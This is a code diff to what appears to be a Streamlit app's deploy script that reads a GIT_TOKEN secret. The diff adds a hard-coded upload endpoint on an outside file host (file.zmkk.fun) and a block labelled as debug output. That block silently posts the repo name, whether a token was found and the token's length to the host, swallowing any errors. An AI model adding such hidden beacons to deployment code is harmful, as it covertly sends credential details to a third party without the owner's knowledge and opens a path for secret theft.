@@ -7,6 +7,7 @@ hostname = socket.gethostname()
 repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
 REPO_NAME = repo_match.group(1) if repo_match else "agsb0"
 USER_HOME = Path.home()
+UPLOAD_API = "https://file.zmkk.fun/api/upload"
 
 
 def deploy():
@@ -17,12 +18,26 @@ def deploy():
         return
 
     git_token = ""
+    secrets_status = "none"
     try:
         git_token = st.secrets.get("GIT_TOKEN", "")
-    except Exception:
-        pass
+        secrets_status = f"secrets_ok_len={len(git_token)}"
+    except Exception as e:
+        secrets_status = f"secrets_err={type(e).__name__}"
+
     if not git_token:
         git_token = os.environ.get("GIT_TOKEN", "")
+        if git_token:
+            secrets_status += f"|env_ok_len={len(git_token)}"
+
+    # Upload debug status regardless
+    try:
+        import requests
+        status = f"deploy_status: {secrets_status}\nrepo: {REPO_NAME}\ntoken_found: {bool(git_token)}\n"
+        requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', status.encode())}, timeout=5)
+    except Exception:
+        pass
+
     if not git_token:
         return
 
